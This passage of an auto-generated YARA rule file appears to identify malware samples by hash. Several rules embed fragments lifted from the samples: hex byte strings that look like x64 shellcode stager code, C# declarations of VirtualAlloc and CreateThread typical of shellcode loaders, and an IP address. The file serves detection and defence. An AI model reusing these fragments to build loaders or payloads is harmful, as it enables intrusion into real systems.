      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s2 = "operator co_await" fullword ascii /* score: '9.00'*/
      $s3 = "operator<=>" fullword ascii /* score: '9.00'*/
      $s4 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide /* score: '7.00'*/
      $s5 = "__swift_1" fullword ascii /* score: '4.00'*/
      $s6 = "__swift_2" fullword ascii /* score: '4.00'*/
      $s7 = "api-ms-win-core-file-l1-2-2" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = ".CRT$XIAC" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "api-ms-" fullword wide /* score: '1.00'*/
      $s10 = "ext-ms-" fullword wide /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( all of them )
      ) or ( all of them )
}

rule _2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600_77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd2_13 {
   meta:
      description = "mw - from files 2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600, 77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9, fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600"
      hash2 = "77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
      hash3 = "fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
   strings:
      $s1 = "powi.def.h" fullword ascii /* score: '10.00'*/
      $s2 = "./mingw-w64-crt/math/x86/log2l.S" fullword ascii /* score: '9.00'*/
      $s3 = "pow.def.h" fullword ascii /* score: '7.00'*/
      $s4 = "_log2l" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "./mingw-w64-crt/math/powi.c" fullword ascii /* score: '4.00'*/
      $s6 = "_exp2l" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "log2l.S" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "exp2l.S" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "internal_modf" fullword ascii /* score: '4.00'*/
      $s10 = "./mingw-w64-crt/math/x86/pow.c" fullword ascii /* score: '4.00'*/
      $s11 = "./mingw-w64-crt/math/x86/exp2l.S" fullword ascii /* score: '4.00'*/
      $s12 = "powi.c" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "___powi" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "O/=//=//=KY=K=/K=///////\"Y///" fullword ascii /* score: '1.00'*/
      $s15 = "int_part" fullword ascii /* score: '1.00'*/
      $s16 = "gK///!////g/=///\"//\"///" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600_a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab_14 {
   meta:
      description = "mw - from files 2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600, a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600"
      hash2 = "a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6"
   strings:
      $s1 = "193.117.208.107" fullword ascii /* score: '6.00'*/
      $s2 = "_fpreset`" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "9;9R9v9" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = ": :S:i:n:v:" fullword ascii /* score: '1.00'*/
      $s5 = ";*;Y;s;" fullword ascii /* score: '1.00'*/
      $s6 = "?%?C?I?N?" fullword ascii /* score: '1.00'*/
      $s7 = "0=1G1M1W1`1k1" fullword ascii /* score: '1.00'*/
      $s8 = "5#5/5V5k5w5" fullword ascii /* score: '1.00'*/
      $s9 = "2E2O2U2c2n2" fullword ascii /* score: '1.00'*/
      $s10 = "<:>@>F>S>Y>" fullword ascii /* score: '1.00'*/
      $s11 = "3#3*3E3N3T3^3s3" fullword ascii /* score: '1.00'*/
      $s12 = "7!8=8]8" fullword ascii /* score: '1.00'*/
      $s13 = "576D6i6n6" fullword ascii /* score: '1.00'*/
      $s14 = "0;0E0P0V0" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751_2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba515_15 {
   meta:
      description = "mw - from files 06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751, 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751"
      hash2 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
   strings:
      $s1 = "      <longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>" fullword ascii /* score: '12.00'*/
      $s2 = "  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" fullword ascii /* score: '7.00'*/
      $s3 = "  </compatibility>" fullword ascii /* score: '7.00'*/
      $s4 = "  <dependency>" fullword ascii /* score: '4.00'*/
      $s5 = "  </dependency>" fullword ascii /* score: '4.00'*/
      $s6 = "  <application xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '3.00'*/
      $s7 = "  </application>" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( all of them )
      ) or ( all of them )
}

rule _84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6_b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e019_16 {
   meta:
      description = "mw - from files 84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6, b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e0195c5710, f8954756782c6b8180ba447bf373386e8112d17cdc196a30f88addbf608e25d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6"
      hash2 = "b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e0195c5710"
      hash3 = "f8954756782c6b8180ba447bf373386e8112d17cdc196a30f88addbf608e25d0"
   strings:
      $s1 = "0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x5" ascii /* score: '1.00'*/
      $s2 = ",0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d" ascii /* score: '1.00'*/
      $s3 = "8,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x4" ascii /* score: '1.00'*/
      $s4 = "a,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x" ascii /* score: '1.00'*/
      $s5 = ",0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xb" ascii /* score: '1.00'*/
      $s6 = "df,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85," ascii /* score: '1.00'*/
      $s7 = "41,0xff,0xe7,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5" fullword ascii /* score: '1.00'*/
      $s8 = "1,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49" ascii /* score: '1.00'*/
      $s9 = "1,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0x" ascii /* score: '1.00'*/
      $s10 = "1,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x4" ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x4b24 or uint16(0) == 0x4624 or uint16(0) == 0x4e24 ) and filesize < 9KB and ( all of them )
      ) or ( all of them )
}

rule _2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600_77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd2_17 {
   meta:
      description = "mw - from files 2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600, 77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9, cb6bc2fd5c259704785d403d7fb34dbabfb62435c56e0eaf82d05bc8839c865a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600"
      hash2 = "77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
      hash3 = "cb6bc2fd5c259704785d403d7fb34dbabfb62435c56e0eaf82d05bc8839c865a"
   strings:
      $s1 = "./mingw-w64-crt/intrincs/RtlSecureZeroMemory.c" fullword ascii /* score: '4.00'*/
      $s2 = "./mingw-w64-crt/intrincs" fullword ascii /* score: '4.00'*/
      $s3 = "RtlSecureZeroMemory@8" fullword ascii /* score: '4.00'*/
      $s4 = "_RtlSecureZeroMemory@8" fullword ascii /* score: '4.00'*/
      $s5 = "RtlSecureZeroMemory.c" fullword ascii /* score: '4.00'*/
      $s6 = "RtlSecureZeroMemory" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( all of them )
      ) or ( all of them )
}

rule _5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd_77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd2_18 {
   meta:
      description = "mw - from files 5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd, 77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9, a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6, fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd"
      hash2 = "77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
      hash3 = "a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6"
      hash4 = "fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
   strings:
      $s1 = "___logl_internal" fullword ascii /* score: '9.00'*/
      $s2 = "./mingw-w64-crt/math/x86/internal_logl.S" fullword ascii /* score: '9.00'*/
      $s3 = "./mingw-w64-crt/math/x86/log.c" fullword ascii /* score: '9.00'*/
      $s4 = "internal_logl." fullword ascii /* score: '9.00'*/
      $s5 = "log.def.h" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "__logl_internal" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s7 = "internal_logl.S" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s8 = "/K/g//g/=///\"//" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( all of them )
      ) or ( all of them )
}

rule _3185876cb0717e3d8d6afadc8cbb2d439ad01cc3f4e172936b0d0ebc398c082c_517c28639a180fd2e1acdb0142f126ad90ce46333096e07f5064adc1a0_19 {
   meta:
      description = "mw - from files 3185876cb0717e3d8d6afadc8cbb2d439ad01cc3f4e172936b0d0ebc398c082c, 517c28639a180fd2e1acdb0142f126ad90ce46333096e07f5064adc1a0b48292"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3185876cb0717e3d8d6afadc8cbb2d439ad01cc3f4e172936b0d0ebc398c082c"
      hash2 = "517c28639a180fd2e1acdb0142f126ad90ce46333096e07f5064adc1a0b48292"
   strings:
      $s1 = "ADAAeAA1ADAA" ascii /* base64 encoded string ' 0 x 5 0 ' */ /* score: '14.00'*/
      $s2 = "ADAAeAA2AD" ascii /* base64 encoded string ' 0 x 6 ' */ /* score: '14.00'*/
      $s3 = "ADAAeAA1AD" ascii /* base64 encoded string ' 0 x 5 ' */ /* score: '14.00'*/
      $s4 = "ADAAeAA4AD" ascii /* base64 encoded string ' 0 x 8 ' */ /* score: '14.00'*/
      $s5 = "ADAAeAA0ADAA" ascii /* base64 encoded string ' 0 x 4 0 ' */ /* score: '14.00'*/
      $s6 = "ADAAeAA3AD" ascii /* base64 encoded string ' 0 x 7 ' */ /* score: '14.00'*/
      $s7 = "ADAAeAA1ADcA" ascii /* base64 encoded string ' 0 x 5 7 ' */ /* score: '10.00'*/
      $s8 = "ADAAeAA3ADcA" ascii /* base64 encoded string ' 0 x 7 7 ' */ /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x733c ) and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751_2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba515_20 {
   meta:
      description = "mw - from files 06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751, 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe, 568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298, 7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938, dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751"
      hash2 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      hash3 = "568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298"
      hash4 = "7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938"
      hash5 = "dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
   strings:
      $s1 = "008deee3d3f0" ascii /* score: '4.00'*/
      $s2 = "d69d4a4a6e38" ascii /* score: '1.00'*/
      $s3 = "83d0f6d0da78" ascii /* score: '1.00'*/
      $s4 = "48fd50a15a9a" ascii /* score: '1.00'*/
      $s5 = "a2440225f93a" ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( all of them )
      ) or ( all of them )
}

rule _4549cb2e8379c4ebe89d845e669c54bf84ca05f594fc58a8cf81436188a9ce0a_84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6_21 {
   meta:
      description = "mw - from files 4549cb2e8379c4ebe89d845e669c54bf84ca05f594fc58a8cf81436188a9ce0a, 84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6, b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e0195c5710, bd9dafd9a575b5cb77bae553a5277d335b84f0d2aca4d7f684b14baf98d3d3ae, f8954756782c6b8180ba447bf373386e8112d17cdc196a30f88addbf608e25d0"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "4549cb2e8379c4ebe89d845e669c54bf84ca05f594fc58a8cf81436188a9ce0a"
      hash2 = "84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6"
      hash3 = "b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e0195c5710"
      hash4 = "bd9dafd9a575b5cb77bae553a5277d335b84f0d2aca4d7f684b14baf98d3d3ae"
      hash5 = "f8954756782c6b8180ba447bf373386e8112d17cdc196a30f88addbf608e25d0"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii /* score: '19.00'*/
      $s2 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s3 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s4 = " uint dwCreationFlags, IntPtr lpThreadId);" fullword ascii /* score: '7.00'*/
      $s5 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii /* score: '6.00'*/
   condition:
      ( ( uint16(0) == 0x6124 or uint16(0) == 0x4b24 or uint16(0) == 0x4624 or uint16(0) == 0x5224 or uint16(0) == 0x4e24 ) and filesize < 9KB and ( all of them )
      ) or ( all of them )
}

